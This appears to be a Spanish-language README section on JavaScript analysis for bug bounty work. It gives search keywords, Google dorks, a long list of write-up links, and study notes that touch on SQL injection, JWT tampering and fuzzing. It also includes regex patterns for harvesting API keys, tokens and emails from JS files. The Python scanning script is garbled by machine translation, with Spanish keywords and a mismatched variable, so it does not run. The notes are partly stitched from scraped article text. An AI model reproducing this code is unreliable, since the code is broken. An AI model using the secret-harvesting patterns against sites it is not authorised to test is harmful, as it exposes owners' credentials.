<picture> <img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width ="1050" > </picture>
<br>


### <picture> <img src = "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExa3d1NGMwMHh6NHNuaXNxb2F6amtjM2lkNXVxdXVqcHYwaXNrd3ljbSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/DqBvd3IKURc40jgCdZ/giphy.gif" width = 80px>  </picture> “Palabras claves y Dorks”

#  5

**En esta sección encontrarás palabras clave para el análisis de JavaScript, específicamente dorks.**

<br><br>


```yaml
Keywords (EN)

javascript exposure, sensitive data in JS, api key leak, API key exposed, hardcoded secrets, hardcoded credentials, client-side logic, endpoint discovery, hidden endpoints, JS recon, JavaScript analysis, JavaScript secrets, JavaScript sensitive info, token leak, source code leak, client validation bypass, frontend leak, JS sensitive info disclosure, sensitive routes, hidden routes, internal API, internal endpoint, debug parameter, exposed config, public .js file, javascript mapping, client-side routes, hidden admin path, endpoint enumeration, javascript attack surface, javascript reverse engineering.

```  

```yaml
 Keywords (ES)

análisis de archivos JS, fuga de información en JavaScript, datos sensibles en JS, claves expuestas, secretos en el frontend, credenciales embebidas, endpoints ocultos, rutas internas, bypass de validación del lado del cliente, filtración en archivos .js, reconocimiento JS, descubrimiento de rutas, parámetros de depuración, superficie de ataque JS, lógica expuesta en el cliente, endpoints internos, API interna, análisis de código JavaScript, tokens expuestos, filtración de configuración, archivos JS públicos, enumeración de endpoints, JS sensible, filtración de rutas.
```
<br>

## Dorks útiles <br><br>


Medium (artículos / writeups)
```yaml 
site:medium.com ("javascript exposure" OR "api key leak" OR "sensitive data in JS")
``` 
```yaml
site:medium.com/tag/security "javascript file analysis"
```  
```yam
site:medium.com "bug bounty" "javascript secrets"
```

HackerOne 
```yam
site:hackerone.com/reports "javascript" "sensitive data"
```
```yam
site:hackerone.com/reports "api key exposed" OR "hardcoded secret"
```
```yam
site:hackerone.com/reports "frontend leak"
```

Bugcrowd / Intigriti / Holistic
```yam
site:bugcrowd.com/disclosures "javascript file"
```
```yam
site:intigriti.com blog "javascript secrets"
```
```yam
site:securitylab.github.com "api key" "javascript"
```

PortSwigger / Labs / Cheatsheets
```yam
site:portswigger.net "javascript exposure"
```
```yam
site:portswigger.net/web-security "client-side exposure"
```
```yam
site:portswigger.net/web-security "api key leak"
```

PentesterLab / THM / HTB (guías y labs)
```yam
site:pentesterlab.com "javascript analysis"
```
```yam
site:tryhackme.com "api key leak"
```
```yam
site:academy.hackthebox.com "javascript exposure"
```

GitHub (herramientas y listas)
```yam
site:github.com "javascript secrets" "bug bounty" recon

```
```yam
site:github.com "js endpoint discovery" tool

```
```yam
site:gist.github.com "api key leak" "javascript"

```

Reddit 
```yam
site:reddit.com/r/bugbounty "javascript exposure"
```
```yam
site:reddit.com/r/bugbounty "api key" "frontend"
```

PDF académicos 

```yam
filetype:pdf "javascript sensitive data exposure" -site:owasp.org
```
```yam
filetype:pdf "api key leak" "javascript" 
```

Filtro temporal
```yam
after:2024-01-01 "javascript exposure" OR "api key leak"
```


<br>
<picture> <img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width ="1050" > </picture>
<br>

### <picture> <img src = "https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExb2NxY2JzdWxmeHVqeWtxenp5dTIybWxlMWZ6dnRmcTZsemNwYW4zYyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/0Q6VlwzeMhuL7xFCKG/giphy.gif" width = 80px>  </picture> 182 Informes diferentes

#  6

**“En esta sección encontrarás 182 informes reales sobre análisis de .js que leí, estudié y anoté. Podés copiarlos directamente, importarlos en JSON con mis notas o cargarlos masivamente en tu gestor.”**
<br><br>


## Lista de informes link directo
```yam
https://osintteam.blog/part-2-advanced-js-extraction-analysis-automation-for-bug-bounty-recon-5535e5e04463
https://medium.com/disruptive-labs/static-analysis-of-client-side-javascript-for-pen-testers-and-bug-bounty-hunters-f1cb1a5d5288
https://medium.com/@ali_saadi/zero-click-account-takeover-the-power-of-javascript-analysis-4f1d4fc36a00
https://medium.com/@omarzzu/from-javascript-analysis-to-uuid-pattern-exploration-revealed-a-critical-idor-5c526451e7ec
https://melguerdawi.medium.com/javascript-analysis-to-sql-injection-ca763f9c4c4e
https://rikeshbaniya.medium.com/javascript-analysis-leading-to-admin-portal-access-ea30f8328c8e
https://freedium.cfd/https://infosecwriteups.com/javascript-leads-to-admin-f7afecc21d02
https://freedium.cfd/https://infosecwriteups.com/uncover-hidden-endpoints-secrets-and-vulnerabilities-buried-inside-javascript-files-ea965b43f969
https://freedium.cfd/https://medium.com/legionhunters/information-disclosure-vulnerability-writeup-hackerone-be7fbe7e7893
https://medium.com/@gheeX/exposing-open-redirect-vulnerabilities-javascript-file-analysis-in-http-history-burp-suite-c64bd1c93c54
https://freedium.cfd/https://lopseg.medium.com/navigating-tree-sitter-queries-with-jsluice-for-javascript-file-analysis-061b7cb4ea9d
https://medium.com/greenwolf-security/linting-for-bugs-vulnerabilities-49bc75a61c6
https://hacktivistattacker.medium.com/javascript-hunting-and-analyzing-for-bug-bounty-a15416de32cd
https://medium.com/@jad2121/javascript-deobfuscation-the-easy-way-637d7e9b2952
https://freedium.cfd/https://medium.com/@loyalonlytoday/find-secrets-in-js-files-bug-bounty-587e29025682
https://keroayman77.medium.com/exposed-api-keys-config-files-in-js-file-bug-bounty-790b02a015ff
https://kathanp19.medium.com/beginners-guide-on-how-you-can-use-javascript-in-bugbounty-492f6eb1f9ea
https://freedium.cfd/https://infosecwriteups.com/javascript-enumeration-for-bug-bounties-expose-hidden-endpoints-secrets-like-a-pro-418c2aec318f
https://freedium.cfd/https://infosecwriteups.com/ever-found-a-valid-bug-leaks-in-javascript-files-in-bug-bounties-81ba362612a7
https://medium.com/@logicTech/javascript-tools-for-bugbounty-2024-fc281111c7c0
https://medium.com/@DrSecurityGuru/js-enumeration-tools-for-bug-bounty-hunting-identifying-vulnerabilities-and-gaining-website-40419a2b5af7
https://freedium.cfd/https://medium.com/@ibtissamhammadi1/how-to-find-js-files-for-vulnerabilities-a-bug-bounty-hunters-guide-3ecf207b4845
https://medium.com/@sharp488/passively-found-secrets-in-javascript-file-on-a-private-bug-bounty-program-36eb29c2a35c
https://freedium.cfd/https://medium.com/@devanshpatel930/how-did-i-hack-a-website-just-by-reading-js-files-6d6a6a90aac1
https://freedium.cfd/https://infosecwriteups.com/11-secrets-in-js-files-and-how-to-find-them-f4088cf71610
https://freedium.cfd/https://infosecwriteups.com/unearthing-digital-gold-a-practical-guide-to-finding-bugs-in-javascript-files-1e6338c73899
https://freedium.cfd/https://medium.com/@iski/key-to-the-kingdom-how-i-found-api-secrets-hiding-in-plain-sight-in-javascript-files-2f92ab1dfe63
https://medium.com/@zoningxtr/how-i-discovered-hidden-json-graphql-requests-and-won-a-10-000-bug-bounty-dc0d72b4aba4
xtr/bug-bounty-goldmine-hidden-inputs-in-ajax-json-graphql-where-hunters-strike-gold-cb2936addf57
https://infosecwriteups.com/unleash-the-power-of-js-link-finder-hunt-hidden-endpoints-like-a-pro-deb77530155f
https://medium.com/@Tanvir0x1/750-bug-bounty-the-story-of-a-hidden-discount-code-in-js-files-1a39bbecff27
https://medium.com/@marduk.i.am/recon-methodology-javascript-file-hunting-254127ecd211
https://freedium.cfd/https://infosecwriteups.com/token-tales-finding-hidden-api-keys-in-javascript-and-turning-them-into-gold-e4e93c51e52b
https://freedium.cfd/https://amannsharmaa.medium.com/day-21-the-ghost-api-how-i-found-a-secret-backdoor-in-a-fortune-500s-javascript-5bd4f17e17dd
https://freedium.cfd/https://medium.com/@narendarlb123/%EF%B8%8F-javascript-recon-via-github-finding-secrets-before-you-even-hit-the-app-cb88e36bc0d7
https://freedium.cfd/https://javascript.plainenglish.io/burp-extensions-js-recon-on-steroids-from-endpoints-to-exploits-4c5946997201
https://freedium.cfd/https://javascript.plainenglish.io/404-js-github-a-triple-threat-attack-surface-82775003f078
https://medium.com/@zoningxtr/how-javascript-runs-browser-vs-pc-vs-beyond-understanding-its-environment-benefits-efe7c4621e4f
https://freedium.cfd/https://javascript.plainenglish.io/10-javascript-mistakes-even-senior-developers-still-make-and-how-to-avoid-them-e5977848f327
https://freedium.cfd/https://infosecwriteups.com/day-15-the-phantom-js-threat-how-forgotten-code-became-a-silent-rce-bomb-e4f9551b14d8
https://freedium.cfd/https://javascript.plainenglish.io/javascript-burp-github-supply-chain-goldmine-81cbf39d575c
https://freedium.cfd/https://javascript.plainenglish.io/ghosts-in-the-heap-memory-leaks-in-javascript-and-how-to-hunt-them-like-a-pro-0519d95d1630
https://cyphernova1337.medium.com/how-i-used-the-js-map-file-to-gain-admin-access-e30e6f00adb7
https://freedium.cfd/https://osintteam.blog/uncovering-hidden-admin-tools-via-javascript-debug-flags-96813d62cc9d
https://freedium.cfd/https://medium.com/h7w/deep-recon-finding-secrets-in-javascript-with-deep-recon-99abb2c9ad85
https://freedium.cfd/https://medium.com/legionhunters/js-map-deep-recon-for-bug-hunters-c9571a053fbb
https://freedium.cfd/https://infosecwriteups.com/js-file-leak-could-lead-to-app-exploits-260c8f008c00
https://freedium.cfd/https://medium.com/meetcyber/js-is-the-new-s3-how-i-mined-tokens-pii-devops-secrets-from-javascript-for-bounties-13b6bdf1b829
https://freedium.cfd/https://osintteam.blog/from-jsleaks-to-jwt-tokens-extracting-secrets-from-javascript-like-a-pro-dd351d43a9f8
https://freedium.cfd/https://javascript.plainenglish.io/%EF%B8%8F-%EF%B8%8F-javascript-opsec-fails-how-i-found-secrets-endpoints-and-pii-in-js-files-ef02cead4648
https://s41n1k.medium.com/how-i-downloaded-all-bitbucket-repos-by-finding-a-leaked-token-in-a-js-file-for-4k-bounty-a701d6effa50
https://freedium.cfd/https://iaraoz.medium.com/ultimate-api-bug-bounty-find-secure-hidden-api-endpoints-139c8f0a061a
https://freedium.cfd/https://javascript.plainenglish.io/javascript-file-mining-for-hidden-endpoints-with-real-bug-bounty-examples-a6a29f2ec4fc
https://freedium.cfd/https://javascript.plainenglish.io/javascript-files-a-pentesters-treasure-trove-ec4c393a23c5
https://freedium.cfd/https://javascript.plainenglish.io/prompt-engineering-toolkit-for-javascript-recon-2025-edition-6209c57ce8ef
https://javascript.plainenglish.io/dom-xss-the-client-side-time-bomb-in-your-javascript-1ff51e44fd35
https://freedium.cfd/https://infosecwriteups.com/how-did-i-hack-a-website-just-by-reading-js-files-80f73cbfd4c1
https://freedium.cfd/https://medium.com/@ibtissamhammadi1/how-i-found-an-8-427-js-security-bug-in-30-minutes-1c37d97bdae1
https://freedium.cfd/https://osintteam.blog/javascript-for-hackers-the-ultimate-guide-for-offensive-security-5631473baa22
https://freedium.cfd/https://infosecwriteups.com/500-bounty-xss-via-javascript-urls-a04900631701
https://freedium.cfd/https://infosecwriteups.com/uncover-hidden-endpoints-secrets-and-vulnerabilities-buried-inside-javascript-files-ea965b43f969
https://javascript.plainenglish.io/javascript-jwts-and-the-key-that-shouldnt-exist-d97c01d0ce9e
https://freedium.cfd/https://osintteam.blog/dom-xss-via-postmessage-javascript-injection-inside-iframes-8a5f6912fba4
https://freedium.cfd/https://infosecwriteups.com/from-js-file-to-jackpot-how-i-found-api-keys-and-secrets-hidden-in-production-code-87af8750b751
https://freedium.cfd/https://infosecwriteups.com/%EF%B8%8F-%EF%B8%8F-unlisted-but-not-unseen-how-i-found-the-admin-panel-in-a-javascript-comment-f34af758b4c8
https://hackersatty.medium.com/bug-bounty-how-i-leaked-admin-metadata-from-a-low-privileged-account-a-deep-dive-into-23e0d699d792
https://freedium.cfd/https://infosecwriteups.com/the-image-that-spoke-javascript-bdbd368921e4
https://freedium.cfd/https://infosecwriteups.com/%EF%B8%8F-unsafe-eval-unlimited-control-how-a-js-sink-let-me-run-anything-60794929a295
https://freedium.cfd/https://infosecwriteups.com/hidden-tokens-open-wallets-how-i-found-payment-api-keys-in-production-javascript-7810b3113e04
https://systemweakness.com/how-a-javascript-file-led-me-to-an-open-redirect-vulnerability-eefce51303b2
https://freedium.cfd/https://infosecwriteups.com/from-csp-to-omg-how-a-tiny-misconfigured-header-let-me-run-js-anywhere-054e30090230
https://freedium.cfd/https://medium.com/@zoningxtr/mastering-event-handlers-in-javascript-and-html-the-complete-guide-with-examples-60ef2c4d025b
https://freedium.cfd/https://infosecwriteups.com/exposed-and-ignored-how-a-javascript-api-key-gave-me-full-cloud-access-%EF%B8%8F-e00a7301ffb6
https://freedium.cfd/https://infosecwriteups.com/dom-inated-how-a-tiny-js-sink-turned-into-critical-xss-a9a1dbe97df2
https://freedium.cfd/https://medium.com/@vipulsonule71/finding-exposed-sensitive-api-keys-in-js-files-a-hackers-guide-%EF%B8%8F-%EF%B8%8F-50809fe2c52a
https://freedium.cfd/https://osintteam.blog/this-is-how-i-use-browser-to-fetch-js-endpoints-for-good-paying-bugs-3ca824e20aa5
https://anishkashukla.medium.com/hacking-javascript-files-to-get-the-sensitive-data-2526416a8afd
https://freedium.cfd/https://medium.com/@vipulsonule71/secrets-in-javascript-finding-api-keys-and-endpoints-like-a-bug-bounty-hunter-613c66412baa
https://medium.com/@zoningxtr/html-tags-and-their-javascript-interactive-attributes-7534e7de0cb1
https://medium.com/@zoningxtr/before-code-runs-understanding-the-javascript-execution-environment-fe79047926af
https://medium.com/@zoningxtr/javascript-all-important-browser-functions-f40423714ebb
https://medium.com/@zoningxtr/what-is-a-javascript-attribute-e6b4e5b6317c
https://medium.com/@zoningxtr/what-is-javascript-and-why-hackers-love-it-b6135b3d089e
https://medium.com/@zoningxtr/javascript-built-in-functions-7a4070ca592a
https://medium.com/@zoningxtr/%EF%B8%8Fxss-prevention-101-why-using-value-keeps-your-javascript-secure-52d9e062ca13
https://medium.com/@zoningxtr/hidden-entrances-where-javascript-urls-are-still-allowed-a52842c6aee6
https://medium.com/@zoningxtr/javascript-jump-start-series-4bf380051fac
https://freedium.cfd/https://infosecwriteups.com/a-great-tool-that-will-be-helpful-in-your-bug-bounty-pentesting-journey-8ce118f4ea00
https://osintteam.blog/finding-javascript-files-on-websites-using-automation-f8b8e03e3d66
https://freedium.cfd/https://cybersecuritywriteups.com/how-i-discovered-a-stored-xss-vulnerability-in-js-files-7b527d2c8962
https://medium.com/@oXnoOneXo/how-i-got-a-stored-xss-by-searching-through-js-files-fdfe2490668b
https://bitpanic.medium.com/finding-exposed-sensitive-api-keys-in-js-files-5c129fb1f2c7
https://freedium.cfd/https://infosecwriteups.com/easy-way-to-find-exposed-sensitive-api-keys-in-js-files-d9f9fccb18bb
https://freedium.cfd/https://infosecwriteups.com/finding-an-api-key-in-a-js-file-in-the-comments-67b30af1d451
https://hackersatty.medium.com/1000-bug-bounty-guide-uncovering-hidden-vulnerabilities-through-javascript-analysis-c3f1a698b91b
https://freedium.cfd/https://medium.com/h7w/how-to-find-xss-vulnerabilities-in-react-js-websites-46f843bb932e
https://systemweakness.com/advanced-techniques-for-identifying-leaked-api-keys-in-js-files-bb67845e5c0e
https://freedium.cfd/https://systemweakness.com/ever-found-a-valid-bug-leaks-in-javascript-files-part-1-efe1f535983b
https://freedium.cfd/https://systemweakness.com/javascript-for-hackers-a-full-tutorial-84a2be091427
https://hackersatty.medium.com/500-secrets-uncovering-critical-vulnerabilities-with-advanced-javascript-analysis-ab9a970dc8e8
https://freedium.cfd/https://medium.com/h7w/mastering-javascript-can-it-make-you-an-xss-bug-hunter-a0f0aaba0c6f
https://medium.com/@0xbugatti/js-review-and-abuse-graphql-result-10xbac-admin-panel-ato-0f013fe471ea
https://freedium.cfd/https://medium.com/@ahmed.elshaepe/all-about-javascript-analysis-for-bug-bounty-hunting-3e0f941c9676
https://freedium.cfd/https://medium.com/@marduk.i.am/recon-methodology-javascript-file-hunting-254127ecd211
https://freedium.cfd/https://blog.stackademic.com/hunting-javascript-file-for-bug-hunters-e8b278a1306a
https://freedium.cfd/https://hackersatty.medium.com/1000-bug-bounty-guide-uncovering-hidden-vulnerabilities-through-javascript-analysis-c3f1a698b91b
https://freedium.cfd/https://medium.com/meetcyber/javascript-recon-for-bug-bounty-pentesting-3b22617007ec
https://freedium.cfd/https://javascript.plainenglish.io/i-found-127-hidden-bugs-in-javascript-files-heres-how-544f6f57346c
https://freedium.cfd/https://medium.com/@owtrain/js-file-enumeration-for-bug-bounty-8d3cce217f32
https://freedium.cfd/https://osintteam.blog/how-to-identify-sensitive-data-in-javascript-files-jsrecon-306b8a2e6462
https://freedium.cfd/https://bensaad0.medium.com/unveiling-hidden-treasures-how-analyzing-javascript-files-led-me-to-tokens-and-secret-keys-84160866baf9
https://osintteam.blog/how-to-identify-sensitive-data-in-javascript-files-jsrecon-306b8a2e6462
https://freedium.cfd/https://infosecwriteups.com/exploring-sensitive-data-in-javascript-files-606447e6a5cd
https://freedium.cfd/https://infosecwriteups.com/how-i-found-100-api-keys-in-javascript-files-js-secrets-exposed-939cc1f22289
https://freedium.cfd/https://medium.com/@hrofficial62/by-using-javascript-analysis-got-200-for-just-an-api-token-leak-information-disclosure-a2f1868ab94f
https://freedium.cfd/https://medium.com/@trapp3rhat/bug-hunting-methodology-part-1-91295b2d2066
https://freedium.cfd/https://l0da.medium.com/how-i-hacked-one-of-these-big-companies-js-files-analysis-7cf47372b642
https://freedium.cfd/https://medium.com/@mrflash403/static-js-analysis-1383a7bf22c7
https://freedium.cfd/https://medium.com/@hrofficial62/analyzing-javascript-files-to-find-bugs-7b277d1df435
https://freedium.cfd/https://infosecwriteups.com/weird-javascript-files-7e6e7296e914
https://freedium.cfd/https://infosecwriteups.com/bug-bounty-tips-tricks-js-javascript-files-bdde412ea49d
https://freedium.cfd/https://medium.com/@rudrasonkusare0222/how-to-perform-static-analysis-of-javascript-files-37b3657d92e8
https://freedium.cfd/https://anasbetis023.medium.com/bugs-js-a-closer-look-at-javascript-for-successful-bug-hunting-fddb0d796498
https://freedium.cfd/https://anontriager.medium.com/javascript-recon-efd981a85cfc
https://oreobiscuit.gitbook.io/introduction/mains/js-analysis-for-bug-bounty
https://kongsec.medium.com/how-to-js-for-bug-bounties-edition-2023-7108b56d9db6
https://kongsec.medium.com/js-for-bug-bounties-2-0-extreme-edition-2024-f167fa48276a
https://kongsec.medium.com/how-to-urling-for-bug-bounties-mastering-urls-edition-2025-a9dca9e2a97f
https://medium.com/legionhunters/js-recon-to-html-injection-4cdca8fd88cf
https://freedium.cfd/http://infosecwriteups.com/exposed-client-secret-in-javascript-resulted-in-quick-bug-bounty-35a609be138d
https://hackersatty.medium.com/how-to-find-hidden-api-endpoints-and-secrets-in-javascript-files-for-bug-bounties-web-app-f4ea92d16954
https://blogs.jsmon.sh/100-regex-patterns/
https://www.intigriti.com/researchers/blog/hacking-tools/testing-javascript-files-for-bug-bounty-hunters
https://sechunter.medium.com/js-is-love-%EF%B8%8F-ca393a4849e9
https://medium.com/@z0id/90-of-people-are-doing-this-in-bountys-read-to-find-out-d99a3bb7bea7
https://jsoverson.medium.com/hacking-javascript-with-javascript-6adbeaba22e9
https://medium.com/@ghostlulzhacks/vulnerable-javascript-file-188b6287179
https://freedium.cfd/https://javascript.plainenglish.io/i-used-usedjs-to-find-100-vulnerabilities-heres-how-4c510fdb1f63
https://freedium.cfd/https://medium.com/meetcyber/250-bounty-poisoning-the-prototype-exploiting-lodashs-hidden-attack-surface-bbc092de974c
https://freedium.cfd/https://osintteam.blog/hunting-for-secrets-in-source-maps-map-files-de969e4b0cdb
https://medium.com/infosecmatrix/what-is-prototype-pollution-76694f0db76a
https://freedium.cfd/https://gupta-bless.medium.com/understanding-prototype-pollution-95a83f9ee102
https://mux0xx.medium.com/how-to-expand-your-attack-surface-and-avoid-duplicates-6c5b01f32b93
https://freedium.cfd/https://latteandcode.medium.com/10-consejos-trucos-de-javascript-que-conviene-saber-109d8ef99a4c
https://medium.com/williambastidasblog/40-tips-javascript-5b7212a12f94
https://medium.com/@ahmed.elshaepe/all-about-javascript-analysis-for-bug-bounty-hunting-3e0f941c9676
https://0xmaruf.medium.com/grep-tips-for-javascript-analysis-bug-bounty-7dce88266121
https://infosecwriteups.com/bug-bounty-tips-tricks-js-javascript-files-bdde412ea49d
https://blog.shiftleft.io/angular-react-vulnerability-cheatsheet-a3b36f22a0fd
https://freedium.cfd/https://anontriager.medium.com/javascript-recon-efd981a85cfc
https://freedium.cfd/https://medium.com/techiepedia/javascript-code-review-guide-for-bug-bounty-hunters-c95a8aa7037a
https://infosecwriteups.com/finding-an-api-key-in-a-js-file-in-the-comments-67b30af1d451
https://medium.com/@mohammed0x04/how-i-found-two-api-vulnerabilities-using-website-source-code-6c4b0dc54d6f
https://freedium.cfd/https://mikekitckchan.medium.com/a-brief-introduction-to-prototype-pollution-b154c23b40c5
https://medium.com/@gheeX/exposing-open-redirect-vulnerabilities-javascript-file-analysis-in-http-history-burp-suite-c64bd1c93c54
https://freedium.cfd/https://infosecwriteups.com/electron-js-application-penetration-testing-b0809af324f6
https://infosecwriteups.com/prototype-pollution-how-a-javascript-quirk-can-lead-to-complete-application-takeover-9adb5e4f6b6b
https://freedium.cfd/https://bevijaygupta.medium.com/hunting-javascript-files-for-bug-hunters-7355df2215ec
https://freedium.cfd/https://medium.com/@codingbolt.in/reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-e1ad9b482189
https://freedium.cfd/https://medium.com/@hrofficial62/analyzing-javascript-files-to-find-bugs-7b277d1df435
https://freedium.cfd/https://rudrasarkar.medium.com/digging-into-javascript-to-find-the-gem-688c06c38db7
https://medium.com/@mayank_prajapati/prototype-pollution-the-hidden-danger-in-javascript-c8b17002e8da
https://blog.lubi.cz/using-bbrf-for-tracking-javascript-files-76901a03939f
https://blog.stackademic.com/hunting-javascript-file-for-bug-hunters-e8b278a1306a
https://jeetpal2007.medium.com/easiest-way-to-find-hidden-api-from-js-files-ce115a4ad1af
https://freedium.cfd/https://medium.com/@Land2Cyber/javascript-juggernauts-tackling-security-challenges-in-client-side-code-01e426864a26
https://anasbetis023.medium.com/bugs-js-a-closer-look-at-javascript-for-successful-bug-hunting-fddb0d796498
https://freedium.cfd/https://lopseg.medium.com/navigating-tree-sitter-queries-with-jsluice-for-javascript-file-analysis-061b7cb4ea9d
https://satyasai1460.medium.com/sensitive-information-disclosure-in-js-leads-to-admin-panel-access-6e26b177e3b4
https://medium.com/@abdelrahmanyousef33/how-i-discovered-an-exposed-api-access-token-in-a-javascript-file-uncovering-sensitive-company-f14524f2123e
https://medium.com/@riza/time-traveling-for-money-discovering-secrets-in-vintage-javascript-files-7deece114b93
https://medium.com/@omarahmed_13016/%D9%90account-takeover-hidden-in-javascript-files-plus-some-extra-work-my-type-a2eb8208f049
https://medium.com/@rajeevranjancom/analyze-javascript-malware-966f79abf55f
https://freedium.cfd/https://northstar1.medium.com/analyzing-javascript-files-part-2-4b9b13c474c1
https://medium.com/@ratnadip1998/how-to-find-access-admin-panel-by-digging-into-js-files-282d89391a2d
https://melotover.medium.com/can-analyzing-javascript-files-lead-to-remote-code-execution-f24112f1aa1f
https://zhenwarx.medium.com/how-we-hacked-bypassed-admin-panel-just-by-js-file-eaa773b5cdb4
https://freedium.cfd/https://javascript.plainenglish.io/javascript-security-weak-type-bypass-b3c0895b6e5f
https://mturhanlar.medium.com/javascript-101-comparison-conditions-04-f4d136652248
https://mturhanlar.medium.com/javascript-101-embedding-objects-arrays-03-e91906ecddcc
https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746
https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2
```

Utilizar mi herramienta Gestor de Informes para subir informes masivamente y crear automáticamente las notas y enlaces (aquí):
<br><br>


## Importar JSON de herramientas con mis notas:

• <a href="https://github.com/Aquiles369/js_analisis/tree/main/assets/json_informes" target="_blank" rel="noopener">JSON con notas personales de cada uno de los 182 informes de análisis de JavaScript</a>


<br><br>


## Lo que aprendí leyendo de esos informes:

• Nada interesante solo  esto: 


 un script de Python que escanea los archivos JS descargados y los extrae:

importar re 
importar sistema operativo 

# Patrones de expresiones regulares
 puntos finales = re. compilar ( r'["\'](\/[a-zA-Z0-9_\-\/\.?=&]+)["\']' ) 
api_keys = re. compilar ( r'(?i)(api[_-]?key|secret|token)["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-]{16,})["\']' ) 
urls = re. compilar ( r'https?:\/\/[^\s"\']+' ) 

directorio = "downloaded_js" 

para nombre_de_archivo en os.listdir(directorio): 
    ruta = os.path.join(directorio, nombre_de_archivo) 
    con  abierto (ruta, 'r' , codificación= 'utf-8' , errores= 'ignorar' ) como f: 
        contenido = f.read() 
        imprimir ( f"\n--- {nombre_de_archivo} ---" ) 
        imprimir ( "🔗 Puntos finales:" ) 
        para  coincidencia  en puntos_de_archivo.findall(contenido): 
            imprimir ( f"   { coincidencia } " ) 
        imprimir ( "🔐 Claves: " ) 
        para  coincidencia  en api_keys.findall(contenido): 
            imprimir ( f"   { coincidencia } " ) 
        imprimir ( "🌐 URL:" ) 
        para  coincidencia  en urls.findall(contenido): 
            imprimir ( f"   { coincidencia } " )
La minimización se refiere al proceso de eliminar datos innecesarios o redundantes sin afectar la forma en que el navegador procesa el recurso (por ejemplo, comentarios y formato de código, eliminación de código no utilizado, uso de nombres de variables y funciones más cortos, etc.).

La ofuscación implica realizar modificaciones en el programa, cambiando los nombres de las variables, funciones y miembros, lo que hace que el programa sea mucho más difícil de entender.

Existen varias herramientas que permiten minimizar JavaScript. UglifyJS es una herramienta útil para minimizar código JS y también está disponible como paquete npm.
Presione enter o haga clic para ver la imagen en tamaño completo



Existen varias herramientas que permiten desminificar JavaScript. JS Beautifier permite embellecer y desofuscar ciertos esquemas de ofuscación. Puedes usar esta herramienta a través de Node.js , Python , en línea o en un editor de código como VS Code .
Presione enter o haga clic para ver la imagen en tamaño completo


Al realizar la desofuscación, especialmente al revertir malware, no existe una técnica o herramienta universal. Deberá probar diversas herramientas, esquemas de desofuscación y realizar análisis manuales. Existen diversas herramientas que pueden ayudarle a desofuscar código JavaScript. Algunas de las herramientas que usamos con frecuencia son JStillery , JSDetox , JS-Beautifier , IlluminateJs , JSNice , etc.


relative-url-extractor de Jobert Abma es muy útil para identificar rápidamente todas las rutas relativas en un archivo JavaScript. Esta herramienta funciona tanto con archivos JavaScript locales como remotos. También funciona directamente con JavaScript minimizado.
Presione enter o haga clic para ver la imagen en tamaño completo

La búsqueda basada en entropía es eficaz para identificar secretos suficientemente aleatorios, como claves API y tokens.

DumpsterDiver , Repo-supervisor y truffleHog son herramientas fantásticas para buscar secretos en archivos de código fuente. La mayoría de estas herramientas admiten búsquedas basadas en entropía y expresiones regulares. Además, son fáciles y altamente personalizables, tanto en la búsqueda de expresiones regulares como en la de entropía.
Presione enter o haga clic para ver la imagen en tamaño completo

No olvide que grep/sed/awk también son bastante potentes a la hora de buscar información confidencial específica en los archivos de código fuente.

 El uso incorrecto de métodos en Angular también puede provocar problemas de XSS. La función es otro punto donde pueden surgir problemas tanto en el lado del cliente como en el del servidor.bypassSecurityTrustXeval

La API postMessage es una alternativa a JSONP, XHR con encabezados CORS y otros métodos que permiten el envío de datos entre orígenes omitiendo la Política del Mismo Origen (SOP). La idea de evadir la SOP y comunicarse con diferentes orígenes debería ser de interés para los atacantes. Existen varias vulnerabilidades de seguridad al usar postMessage. Una vez que comprenda los posibles problemas de seguridad asociados con postMessage, puede buscar la implementación en archivos JavaScript. En el lado del remitente del mensaje, busque un listenerwindow.postMessagey, en el lado del receptor, un `listener`window.addEventListener. Tenga en cuenta que muchos frameworks implementan `wrappers` en torno a postMessage.
localStorage y sessionStorage son objetos de almacenamiento web HTML. Con el almacenamiento web, las aplicaciones web pueden almacenar datos localmente en el navegador del usuario. Es importante identificar qué se almacena mediante el almacenamiento web, especialmente almacenar información confidencial, ya que puede generar posibles problemas de seguridad. En JavaScript, se pueden buscar window.localStoragey window.sessionStorage.

. ESLint es uno de los linters de JavaScript más populares. ESLint se puede personalizar fácilmente añadiendo reglas personalizadas. Hay muchas reglas de seguridad personalizadas disponibles para ESLint, especialmente diseñadas para frameworks modernos como Angular, React, etc.
Interesante la parte de como bypass el login cierta parte solamente comprendiendo el bloque de codigo de restablecimiento de contraseña:
Un consejo rápido: Al abrir un sitio y consultar las Herramientas de Desarrollo, verás los archivos JavaScript cargados por tu navegador. Sin embargo, esta no es la imagen completa. Algunos archivos podrían estar ocultos o cargarse dinámicamente, como los de las funciones de administración.

Entonces noté un patrón en los nombres de los archivos, como users.js, customer.js y static.js. Esto me dio una idea: ¿qué tal si intento manipular los nombres de los archivos JavaScript?

""
Intersante fuzzin con diccionario personalizado encontro archivo reports.js 
""

encontré un punto final en el lado del cliente que me permitía modificar (mis propios) documentos gubernamentales mediante una solicitud de API

No limite su análisis a los archivos JavaScript accesibles: busque también los ocultos.
Nunca confíes en los UUID: ¡pueden ser engañosos!
Analizando js encontro un parametro nuevo no listado y probe sql inyeccion
comillas simple y response encontre el error sql y con la tool de sqlmap logro sacarlo.
Encontre varios puntos finales donde logro cambiar su token jwt y lograr ingresar a recursos interesantes.
Interesante logro encontrar jwt luego de unir 2 directorio en uno  y hacer fuzzin resultado duplicado interno.
Direcciones de correo electrónico:[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}
pues encontro analizando 10 .js de hackeroner autenticado haciendo fuzzin a un directorio encontro php-info severidad media.
encontro un parametro lo probo con open redirect funciono estado duplicado no logro ejecutar xss.
